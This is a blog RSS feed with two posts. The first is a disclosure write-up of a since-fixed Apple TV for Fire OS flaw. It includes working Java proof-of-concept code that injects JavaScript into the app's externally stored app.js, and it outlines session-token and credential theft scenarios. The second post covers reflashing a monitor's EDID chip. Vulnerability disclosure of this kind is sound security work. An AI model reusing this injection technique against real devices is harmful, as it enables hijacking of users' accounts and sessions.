@@ -1,0 +1,223 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Razvan Sima</title><link>/posts/</link><description>Recent content in Posts on Razvan Sima</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Mon, 05 Apr 2021 13:37:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Apple TV for Fire OS code execution</title><link>/posts/apple-tv-code-execution/</link><pubDate>Mon, 05 Apr 2021 13:37:00 +0000</pubDate><guid>/posts/apple-tv-code-execution/</guid><description>TL; DR Any app on Fire OS that has been granted permission to use external storage can execute code in the context of the Apple TV app.
+Story While bored during lockdown I wanted to port the Apple TV app to my Android TV so that I didn’t have to use my Fire TV stick. While looking into this I found a very interesting behavior, the Apple TV app on Fire OS was writing files to external storage and then executing the files.</description><content type="html"><![CDATA[<h2 id="tl-dr">TL; DR</h2>
+<p>Any app on Fire OS that has been granted permission to use external storage can execute code in the context of the Apple TV app.</p>
+<h2 id="story">Story</h2>
+<p>While bored during lockdown I wanted to port the Apple TV app to my Android TV so that I didn’t have to use my Fire TV stick. While looking into this I found a very interesting behavior, the Apple TV app on Fire OS was writing files to external storage and then executing the files.</p>
+<p>This is a very odd behavior but not uncommon for Android apps to write files to external storage, and there’s been previous <a href="https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/">research</a> that shows how dangerous this can be. However, in this case the Apple TV app directly executes files from external storage.</p>
+<h3 id="why">Why?</h3>
+<p>After more time spent looking into why you would need to extract files and then execute them, it turns out the Apple TV app on Fire OS actually has another app embedded within the APK as a zip file which is then extracted and executed.</p>
+
+    <img src="resources.png"  alt="resources"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+
+    <img src="extract.png"  alt="extract"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>What’s in the zip file? Well, it contains a NodeJS like app that uses a framework called Luna. Could this be the same Luna that is on webOS running on LG TVs? Possibly - and it could mean that other ported versions of the Apple TV app are affected by this issue.</p>
+
+    <img src="other.png"  alt="other"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>Back to our problem, we know that the Apple TV app extracts the embedded app from the zip into external storage and then the NodeJS app takes over and handles all the logic/UI stuff. Let’s explore further.</p>
+<h3 id="whats-the-problem">What’s the problem?</h3>
+<p>A quick background on Android storage, there are 2 types of storage that developers can use (1) Internal storage which is protected from other apps and (2) External storage which is shared between all apps and has some basic protections. External storage exists as an emulated storage on devices which don’t have a physical external storage.</p>
+<p>Android apps can use external storage without having to ask the user for permission. This is the default behavior and is also how the Apple TV app uses external storage.</p>
+
+    <img src="getExternalFilesDirs.png"  alt="getExternalFilesDirs"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>Android apps can write to external storage by default using <code>getExternalFilesDirs</code> method and similar APIs. This will give apps access to special folders in the external storage which are protected from other applications but ONLY if the other apps don’t have the external storage permission granted.</p>
+<p>For example, by default apps can use <code>getExternalFilesDirs</code> and write to their folder:</p>
+<pre><code>/storage/emulated/0/Android/data/&lt;my package name&gt;/files
+</code></pre>
+<p>But can NOT read or write to other apps’ folder:</p>
+<pre><code>/storage/emulated/0/Android/data/&lt;other package name&gt;/files
+</code></pre>
+<p>Any app can ask the user for permission to use external storage however it pleases, and if the user agrees, the app will be granted the <code>WRITE_EXTERNAL_STORAGE</code> permission. This will allow to write to any folder or file owned by the group <code>sdcard_rw</code> under the folder:</p>
+<pre><code>/storage/emulated/0
+</code></pre>
+<p>These are the contents of external storage after the Apple TV app extracts the embedded zip file:</p>
+
+    <img src="external.png"  alt="external"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>Note the group owner is <code>sdcard_rw</code> which is given to all apps that have been granted the external storage permission by the user.</p>
+<h2 id="poc">POC</h2>
+<p>For our POC exploit we are going to autogenerate a Hello World app using Android Studio and add some logic for permission request and writing to external storage. Then we modify a script (app.js) in the Apple TV app’s external storage with our exploit code.</p>
+<p>Before we proceed, we need to make sure our special permissions are added to the <code>AndroidManifest.xml</code> file.</p>
+<pre><code class="language-xml">&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;
+</code></pre>
+<p>We can start with a <code>MainActivity</code> that looks similar to this:</p>
+<pre><code class="language-java">public class MainActivity extends Activity
+  implements ActivityCompat.OnRequestPermissionsResultCallback {
+
+private static final String TAG = &quot;MainActivity&quot;;
+private static final int PERMISSION_WRITE_EXTERNAL_STORAGE = 10;
+
+@Override
+public void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+
+    if (ActivityCompat.checkSelfPermission
+      (this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            == PackageManager.PERMISSION_GRANTED) {
+        startExploit();
+    } else {
+        requestPermission();
+    }
+
+}
+</code></pre>
+<p>In <code>onCreate</code> we begin with a check to see if the user granted the external storage permission and if not then we request it. If the permission is granted then we can proceed with the exploit.</p>
+<p>The permission request logic is shown in the code below:</p>
+<pre><code class="language-java">private void requestPermission() {
+    ActivityCompat.requestPermissions(this,
+      new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_WRITE_EXTERNAL_STORAGE);
+}
+</code></pre>
+<p>Once the user accepts or denies the permission our code contained in the following method will be called:</p>
+<pre><code class="language-java">@Override
+public void onRequestPermissionsResult(int requestCode,
+                              @NonNull String[] permissions,
+                              @NonNull int[] grantResults) {
+    if (requestCode == PERMISSION_WRITE_EXTERNAL_STORAGE) {
+        if (grantResults.length == 1 &amp;&amp;
+            grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            startExploit();
+        }
+    }
+}
+</code></pre>
+<p>We only check if the permission is granted and then run the exploit contained in the following snippet:</p>
+<pre><code class="language-java">private void startExploit() {
+  try {
+      File file = new File(&quot;/storage/emulated/0/Android/data/com.apple.atve.amazon.appletv/files/app/app.js&quot;);
+      int length = (int) file.length();
+      byte[] bytes = new byte[length];
+      try (FileInputStream in = new FileInputStream(file)) {
+          in.read(bytes);
+      }
+      String toFind = &quot;async firmwareCheck(){&quot;;
+      String inject = &quot;const b=new _t('ok',{title:'OK'});await Zt.run({title:'Oh No!',body:'Something bad just happened :(',buttons:[b]});&quot;;
+      String contents = new String(bytes);
+      if (contents.contains(inject)) {
+          return;
+      }
+      contents = contents.replace(toFind, toFind + inject);
+      try (FileOutputStream stream = new FileOutputStream(file)) {
+          stream.write(contents.getBytes());
+      }
+  }
+  catch (Exception e) {
+      Log.e(TAG, e.toString());
+  }
+}
+</code></pre>
+<p>The exploit unfolds in the following steps:</p>
+<ol>
+<li>The file at /storage/emulated/0/Android/data/com.apple.atve.amazon.appletv/files/app/app.js is read in a local variable.</li>
+<li>If our exploit code already exists in the file we exit.</li>
+<li>We search for the method <code>firmwareCheck</code> in the file contents and add our code inside it.</li>
+</ol>
+<p>The resulting <code>firmwareCheck</code> method in <code>app.js</code> looks like this:</p>
+<pre><code class="language-javascript">async firmwareCheck(){
+    const b = new _t('ok', {
+        title: 'OK'
+    });
+    await Zt.run({
+        title: 'Oh No!',
+        body: 'Something bad just happened :(',
+        buttons: [b]
+    });
+    // original method goes here
+}
+</code></pre>
+<p>The exploit code creates a new AlertPage and waits for it to be dismissed by the user before continuing. Every time the Apple TV application is opened from now on our code will be executed as well.</p>
+<p>Please note that because of minification this exploit POC may not work in your case depending on the version of the app. The <code>_t</code> and <code>Zt</code> variables in the exploit need to be your corresponding references to <code>ButtonWidget</code> and <code>AlertPage</code>.</p>
+<h2 id="video">Video</h2>
+<p>In the video below the POC is a bit more advanced and shows the contents of <code>LunaSecureStorage</code> which stores session info and cookies. How to accomplish this is left as an exercise for the reader.</p>
+<video controls preload="auto" width="100%"  playsinline class="html-video">
+    <source src="/posts/apple-tv-code-execution/apple_test.mp4" type="video/mp4" }}>
+  <p>Your browser doesn't support embedded videos, but don't worry, you can <a href="/posts/apple-tv-code-execution/apple_test.mp4">download it</a> and watch it with your favorite video player!</p>
+</video>
+<h2 id="conclusion">Conclusion</h2>
+<p>With this simple exploit we demonstrate how an attack may unfold. There are far more devastating scenarios that a real attacker may create in order to compromise user accounts. For example, it could be possible to fake a re-authentication page and steal user credentials, or show a page that would ask the user to update their payment details. It could also be used to launch a silent exploit that steals the current session token and performs actions on behalf of the user in the background or at a later date. Additionally, the user wouldn’t need to open the attacker app, instead a malicious app could be running in the background since its installation and perform the exploit without user input.</p>
+<h2 id="fix">Fix</h2>
+<p>Apple fixed the issue in version 5.1 by extracting the zip file to internal storage.</p>
+
+    <img src="fix.png"  alt="fix"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>As part of the fix, the new version also deletes old content in external storage.</p>
+<p>All versions before 5.1 should be vulnerable to this issue, however, I only verified the POC on 4.0, 4.1, and 5.0.</p>
+<h2 id="timeline">Timeline</h2>
+<p>2020-07-04: Issue reported to Apple, including writeup, POC code, and video</p>
+<p>2020-07-08: Investigation started by Apple</p>
+<p>2020-09-09: Apple confirmed a fix is coming in November and asked to hold disclosure</p>
+<p>2020-10-26: I noticed version 5.1 of the app fixes the issue and asked Apple if I can now disclose the issue</p>
+<p>2020-10-27: Apple asked to withhold disclosure until the issue is credited in their advisory</p>
+<p>2021-02-17: After months of monitoring for new security advisories, I asked Apple when will the advisory be published</p>
+<p>2021-03-19: Apple confirms I can disclose the issue and advisory is published <a href="https://support.apple.com/HT212197">https://support.apple.com/HT212197</a></p>
+<p>UPDATE:</p>
+<p>2021-04-06: The report is in queue to be adjudicated for an Apple Security Bounty</p>
+]]></content></item><item><title>How to change display resolution in hardware</title><link>/posts/change-display-resolution-hardware/</link><pubDate>Fri, 07 Aug 2020 13:13:00 +0000</pubDate><guid>/posts/change-display-resolution-hardware/</guid><description>Disclaimer Don&amp;rsquo;t try this at home or you may break your device.
+Story I recently had an odd problem with an old Dell monitor (U2711). I&amp;rsquo;ve fixed this issue numerous times before in software, but I got tired of having to do it all the time. What was the issue? Well the display supports 1440p resolution over various interfaces except HDMI. These days this wouldn&amp;rsquo;t be a problem because latest HDMI versions support resolutions all the way to 8K.</description><content type="html"><![CDATA[<h2 id="disclaimer">Disclaimer</h2>
+<p>Don&rsquo;t try this at home or you may break your device.</p>
+<h2 id="story">Story</h2>
+<p>I recently had an odd problem with an old Dell monitor (U2711). I&rsquo;ve fixed this issue numerous times before in software, but I got tired of having to do it all the time. What was the issue? Well the display supports 1440p resolution over various interfaces except HDMI. These days this wouldn&rsquo;t be a problem because latest HDMI versions support resolutions all the way to 8K. But my display only had HDMI 1.2 which was capped at 1080p. Normally this display would be connected to a desktop computer through DisplayPort cable without any issues. However, when trying to connect it to my MacBook through HDMI it was always a hassle. Of course, you can force the resolution in your OS in various ways but the issue I had was that it would reset after macOS updates and I also had to deal with SIP every time. So, I had enough and decided to fix it permanently. For that you would have to change the hardware side of things which would be permanent and allow the display to work straight away with any device that connects through HDMI. No more need to fiddle with software configurations.</p>
+<h2 id="attempt-1">Attempt 1</h2>
+<p>First thing I tried was to update the firmware. Unfortunately, I couldn&rsquo;t find a firmware update tool for my exact display model. There are other update tools out there for similar displays but even if I would have reversed engineered the way those tools worked there would have been no guarantee that there would have been a way to dump the firmware. This was necessary because unfortunately I also couldn&rsquo;t find a firmware dump anywhere. So, for this approach to work, you would need an original firmware, then modify it and then reflash it using the reverse engineered update tool.</p>
+<h2 id="attempt-2">Attempt 2</h2>
+<p>The other alternative is to disassemble the display and figure out which chip stores the firmware. Then dump the firmware and modify the EDID relevant to HDMI and reflash the new firmware. The EDID is the configuration data that is sent by a display the first time a device connects to it. It describes in a packed format the display capabilities including the supported resolutions, which is what we&rsquo;re after. More info is available at <a href="https://en.wikipedia.org/wiki/Extended_Display_Identification_Data">https://en.wikipedia.org/wiki/Extended_Display_Identification_Data</a></p>
+<h2 id="lets-start">Let&rsquo;s start</h2>
+<p>It turns out that the display has multiple chips used for data storage. Each cable interface has its own EEPROM chip (24C02RP) containing a different version of EDID. The firmware is stored on a single flash (25L1605D).
+The chip containing the HDMI EDID is shown below, labeled U8:</p>
+
+    <img src="u8.png"  alt="u8"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>There are a lot of ways to program EEPROM chips, you could use an Arduino if you have one, or there are very affordable programmers on ebay or amazon. I used a CH341A USB flasher with a chip clip:</p>
+
+    <img src="clip.png"  alt="clip"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>Depending of which EEPROM chip you are using you may need to use a voltage adapter for the CH341A flasher. By default, signal is at 5V which may be too high for some chips. My flasher has a voltage mod that drops voltage from 5V to 3.3V even though is not needed in this instance because 24C02RP chips have a range of 1.8V to 5.5V. Some chips may only operate at low voltages such as 1.8 and connecting high voltage could destroy it permanently.</p>
+<h2 id="read-edid">Read EDID</h2>
+<p>Now with the clip connected to the chip and the programmer connected through USB to my laptop, I used a Windows VM for the flashing part. These CH341A chips are well supported on Windows and didn&rsquo;t want to thinker with drivers, so a VM was the fastest solution.</p>
+<p>For software, I used the aptly named <code>CH341A Programmer</code> but there are lots of software that support CH341A such as AsProgrammer. First, we need to select the correct chip type before we do any operations, and then we can confirm that everything is working with a read command.</p>
+
+    <img src="read.png"  alt="read"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>If everything works correctly, the read command should be very fast as the chip contains only 256 bytes of data. Now we can save the data to a file and start working on the modifications we want.</p>
+<p>This was the first time I had worked on EDID. I&rsquo;ve tried a few EDID readers before I settled on EEditGold, but is only available for Windows. Once we feed the data we dumped from the chip to EEditGold, we should see something similar to the below:</p>
+
+    <img src="gold.png"  alt="gold"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>There are a lot of configuration that can be included in the EDID data but what we care about are the Db entries in the VESA section and the DTD entries in the CEA section. Those entries contain the resolution configurations. As you can see in the image above, there are a lot more specifications that we need to worry about other than resolution such as pixel clock and polarity. There are various ways to calculate these but the better option is to just copy these from the DisplayPort EDID or any other display interface EDID that supports our desired resolution.</p>
+<p>Here you can see the side by side changes that I did to my EDID:</p>
+
+    <img src="side1.png"  alt="side1"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+
+    <img src="side2.png"  alt="side2"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>If you run out of space for your added modifications you can delete the entries that you don&rsquo;t need. You can see in the images above that I deleted some DTD entries.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Now all is left is to save our modification and flash the EEPROM with the new EDID data. We can do this the same way we did the read command but now we open the new file from EEditGold in <code>CH341A Programmer</code> and perform a <code>program</code> command. We can also <code>verify</code> the write operation or can perform another <code>read</code> command and verify manually.</p>
+
+    <img src="write.png"  alt="write"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>And now for the moment of truth, we reassemble everything the way it was and we hope we didn&rsquo;t break anything. Our mod worked!</p>
+
+    <img src="end.png"  alt="end"  class="center"  style="border-radius: 5px; margin: 0.8rem auto; max-width: 90%; box-shadow: 0 0 5px 2px grey;"  />
+
+
+<p>YAY! You can see our changes are working! macOS thinks the 1440p resolution is the default for the display and the display is taking 1440p input over HDMI even though the firmware reports that the supported resolution is only 1080p.</p>
+]]></content></item></channel></rss>
